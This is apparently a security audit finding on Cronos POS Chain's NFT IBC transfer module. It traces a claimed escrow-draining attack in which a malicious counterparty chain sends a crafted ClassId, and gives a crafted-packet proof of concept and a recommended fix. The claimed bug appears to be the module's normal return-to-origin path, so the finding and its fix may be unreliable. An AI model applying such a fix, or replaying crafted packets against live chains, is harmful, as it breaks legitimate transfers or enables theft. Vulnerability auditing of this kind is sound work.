### Title
Malicious IBC Counterparty Can Drain Escrowed NFTs via Crafted ClassId in `processReceivedPacket` — (`x/nft-transfer/keeper/packet.go`)

---

### Summary

`processReceivedPacket` uses `packet.SourcePort/SourceChannel` (the counterparty's identifiers) for the `IsAwayFromOrigin` direction check, but uses `packet.DestPort/DestChannel` (Cronos POS Chain's own identifiers) to derive the `escrowAddress`. A malicious counterparty chain can craft a `NonFungibleTokenPacketData.ClassId` that starts with its own port/channel prefix, forcing `IsAwayFromOrigin` to return `false` and entering the unescrow branch, while the `escrowAddress` resolves to the legitimate escrow address holding real NFTs — causing `TransferOwner` to drain them to an attacker-controlled receiver.

---

### Finding Description

**Legitimate flow (setup state):**

When Cronos POS Chain sends NFT `(classID=X, tokenID=T)` via `SendTransfer` on `sourcePort='nft'`, `sourceChannel='channel-0'`:

- `IsAwayFromOrigin('nft', 'channel-0', 'X')` → `true` (X does not start with `nft/channel-0/`)
- NFT is escrowed: `TransferOwner(ctx, 'X', 'T', sender, GetEscrowAddress('nft', 'channel-0'))` [1](#0-0) 

The counterparty chain's channel connecting back to Cronos POS Chain has some channel ID, call it `channel-Y`.

**Attack:**

The malicious counterparty sends a crafted packet to Cronos POS Chain:
- `packet.SourcePort = 'nft'`, `packet.SourceChannel = 'channel-Y'`
- `packet.DestPort = 'nft'`, `packet.DestChannel = 'channel-0'`
- `data.ClassId = 'nft/channel-Y/X'`
- `data.TokenIds = ['T']`, `data.Receiver = attackerAddress`

**Step-by-step execution in `processReceivedPacket`:**

**Step 1 — Direction check:**
```go
isAwayFromOrigin := types.IsAwayFromOrigin(packet.GetSourcePort(), packet.GetSourceChannel(), data.ClassId)
// = IsAwayFromOrigin('nft', 'channel-Y', 'nft/channel-Y/X')
// = !strings.HasPrefix('nft/channel-Y/X', 'nft/channel-Y/') = false
``` [2](#0-1) [3](#0-2) 

**Step 2 — Escrow address resolution:**
```go
escrowAddress := types.GetEscrowAddress(packet.GetDestPort(), packet.GetDestChannel())
// = GetEscrowAddress('nft', 'channel-0')  ← the address holding NFT (X, T)!
``` [4](#0-3) 

**Step 3 — Prefix stripping:**
```go
unprefixedClassID := types.RemoveClassPrefix('nft', 'channel-Y', 'nft/channel-Y/X')
// = 'nft/channel-Y/X'[len('nft/channel-Y/'):] = 'X'
``` [5](#0-4) 

**Step 4 — ClassID resolution:**
```go
voucherClassID := types.ParseClassTrace('X').IBCClassID()
// ParseClassTrace('X') = ClassTrace{Path: "", BaseClassId: "X"}
// IBCClassID() = 'X'  (Path is empty, so no ibc/ hash prefix)
``` [6](#0-5) [7](#0-6) 

**Step 5 — Drain:**
```go
k.nftKeeper.TransferOwner(ctx, 'X', 'T', GetEscrowAddress('nft', 'channel-0'), attackerAddress)
``` [8](#0-7) 

`TransferOwner` calls `IsOwner(ctx, 'X', 'T', escrowAddress)`, which succeeds because the NFT is legitimately owned by the escrow address. The transfer proceeds unconditionally. [9](#0-8) 

**Root cause:** The direction check (`IsAwayFromOrigin`) and the escrow address derivation use *different* channel identifiers — source vs. destination. The attacker controls the `ClassId` field and can always craft it to start with the counterparty's own port/channel prefix, making `IsAwayFromOrigin` return `false` while the `escrowAddress` resolves to Cronos POS Chain's legitimate escrow address.

**No guard prevents this.** `ValidateBasic()` only checks that `ClassId` is non-blank, token/URI lengths match, and addresses are valid bech32 — it does not validate the ClassId against the channel. [10](#0-9) 

The IBC core layer verifies packet commitment proofs and channel existence, but does not validate packet data content.

---

### Impact Explanation

Any NFT held in the escrow address `GetEscrowAddress('nft', 'channel-0')` for a given channel can be stolen by the counterparty chain operator. This includes every NFT ever sent outbound on that channel that has not yet been returned. The attacker receives full ownership of the NFT at the destination address they specify. This is an irreversible theft of user funds/assets.

---

### Likelihood Explanation

The precondition is that at least one NFT is escrowed on the channel — a normal operational state for any active IBC NFT transfer channel. The attack requires the counterparty chain to be malicious or compromised (a realistic IBC threat model assumption for cross-chain security). No governance, admin key, or social engineering is needed beyond operating the counterparty chain.

---

### Recommendation

The unescrow branch must verify that the incoming `ClassId` is consistent with the destination channel, not just the source channel. Specifically, before entering the unescrow branch, validate that `data.ClassId` starts with `GetClassPrefix(packet.GetDestPort(), packet.GetDestChannel())` — i.e., that the NFT was actually prefixed by Cronos POS Chain's own port/channel when it was originally sent outbound. This mirrors the correct invariant: an NFT can only be unescrowed on channel `C` if its ClassId carries the prefix `C` added by this chain. [11](#0-10) [12](#0-11) 

---

### Proof of Concept

```
1. Chain A (Cronos POS Chain): channel-0 ↔ Chain B (malicious): channel-Y

2. Legitimate user on Chain A calls SendTransfer(
     sourcePort='nft', sourceChannel='channel-0',
     classID='X', tokenIDs=['T'], sender=alice, receiver=bob_on_B)
   → NFT (X, T) escrowed at GetEscrowAddress('nft', 'channel-0') on Chain A

3. Chain B (malicious) sends a crafted IBC packet to Chain A:
     packet.SourcePort    = 'nft'
     packet.SourceChannel = 'channel-Y'   // Chain B's own channel ID
     packet.DestPort      = 'nft'
     packet.DestChannel   = 'channel-0'
     data.ClassId         = 'nft/channel-Y/X'
     data.TokenIds        = ['T']
     data.TokenUris       = ['']
     data.Sender          = <any valid bech32>
     data.Receiver        = attacker_address_on_A

4. OnRecvPacket → processReceivedPacket:
     IsAwayFromOrigin('nft','channel-Y','nft/channel-Y/X') = false  → unescrow branch
     escrowAddress = GetEscrowAddress('nft','channel-0')             → holds NFT (X,T)
     unprefixedClassID = 'X'
     voucherClassID = 'X'
     TransferOwner(ctx, 'X', 'T', escrowAddress, attacker_address_on_A)  ✓

5. Assert: escrow address no longer owns (X, T); attacker_address_on_A owns (X, T).
```

### Citations

**File:** x/nft-transfer/keeper/packet.go (L106-111)
```go
		if isAwayFromOrigin {
			// create the escrow address for the tokens
			escrowAddress := types.GetEscrowAddress(sourcePort, sourceChannel)
			if err := k.nftKeeper.TransferOwner(ctx, classID, tokenID, sender, escrowAddress); err != nil {
				return channeltypes.Packet{}, err
			}
```

**File:** x/nft-transfer/keeper/packet.go (L148-148)
```go
	isAwayFromOrigin := types.IsAwayFromOrigin(packet.GetSourcePort(), packet.GetSourceChannel(), data.ClassId)
```

**File:** x/nft-transfer/keeper/packet.go (L151-151)
```go
	escrowAddress := types.GetEscrowAddress(packet.GetDestPort(), packet.GetDestChannel())
```

**File:** x/nft-transfer/keeper/packet.go (L186-202)
```go
	} else {
		// If the token moves in the direction of back to origin,
		// we need to unescrow the token and transfer it to the receiver

		// we should remove the prefix. For example:
		// p6/c6/p4/c4/p2/c2/nftClass -> p4/c4/p2/c2/nftClass
		unprefixedClassID := types.RemoveClassPrefix(packet.GetSourcePort(),
			packet.GetSourceChannel(), data.ClassId)

		voucherClassID := types.ParseClassTrace(unprefixedClassID).IBCClassID()
		for _, tokenID := range data.TokenIds {
			if err := k.nftKeeper.TransferOwner(ctx,
				voucherClassID, tokenID, escrowAddress, receiver); err != nil {
				return err
			}
		}
	}
```

**File:** x/nft-transfer/types/trace.go (L32-34)
```go
func GetClassPrefix(portID, channelID string) string {
	return fmt.Sprintf("%s/%s/", portID, channelID)
}
```

**File:** x/nft-transfer/types/trace.go (L40-43)
```go
func RemoveClassPrefix(portID, channelID, classID string) string {
	classPrefix := GetClassPrefix(portID, channelID)
	return classID[len(classPrefix):]
}
```

**File:** x/nft-transfer/types/trace.go (L49-52)
```go
func IsAwayFromOrigin(sourcePort, sourceChannel, fullClassPath string) bool {
	prefixClassID := GetClassPrefix(sourcePort, sourceChannel)
	return !strings.HasPrefix(fullClassPath, prefixClassID)
}
```

**File:** x/nft-transfer/types/trace.go (L61-75)
```go
func ParseClassTrace(rawClassID string) ClassTrace {
	classSplit := strings.Split(rawClassID, "/")

	if classSplit[0] == rawClassID {
		return ClassTrace{
			Path:        "",
			BaseClassId: rawClassID,
		}
	}

	return ClassTrace{
		Path:        strings.Join(classSplit[:len(classSplit)-1], "/"),
		BaseClassId: classSplit[len(classSplit)-1],
	}
}
```

**File:** x/nft-transfer/types/trace.go (L102-107)
```go
func (ct ClassTrace) IBCClassID() string {
	if ct.Path != "" {
		return fmt.Sprintf("%s/%s", ClassPrefix, ct.Hash())
	}
	return ct.BaseClassId
}
```

**File:** x/nft/keeper/keeper.go (L121-138)
```go
func (k Keeper) TransferOwner(
	ctx sdk.Context, denomID, tokenID string, srcOwner, dstOwner sdk.AccAddress,
) error {
	if !k.HasDenomID(ctx, denomID) {
		return sdkerrors.Wrapf(types.ErrInvalidDenom, "denom ID %s not exists", denomID)
	}

	nft, err := k.IsOwner(ctx, denomID, tokenID, srcOwner)
	if err != nil {
		return err
	}

	nft.Owner = dstOwner.String()

	k.setNFT(ctx, denomID, nft)
	k.swapOwner(ctx, denomID, tokenID, srcOwner, dstOwner)
	return nil
}
```

**File:** x/nft-transfer/types/packet.go (L41-72)
```go
func (nftpd NonFungibleTokenPacketData) ValidateBasic() error {
	if strings.TrimSpace(nftpd.ClassId) == "" {
		return newsdkerrors.Wrap(ErrInvalidClassID, "classId cannot be blank")
	}

	if len(nftpd.TokenIds) == 0 {
		return newsdkerrors.Wrap(ErrInvalidTokenID, "tokenId cannot be blank")
	}

	if len(nftpd.TokenIds) != len(nftpd.TokenUris) {
		return newsdkerrors.Wrap(ErrInvalidPacket, "tokenIds and tokenUris lengths do not match")
	}

	if strings.TrimSpace(nftpd.Sender) == "" {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "sender address cannot be blank")
	}

	// decode the sender address
	if _, err := sdk.AccAddressFromBech32(nftpd.Sender); err != nil {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "invalid sender address")
	}

	if strings.TrimSpace(nftpd.Receiver) == "" {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "receiver address cannot be blank")
	}

	// decode the receiver address
	if _, err := sdk.AccAddressFromBech32(nftpd.Receiver); err != nil {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "invalid receiver address")
	}
	return nil
}
```
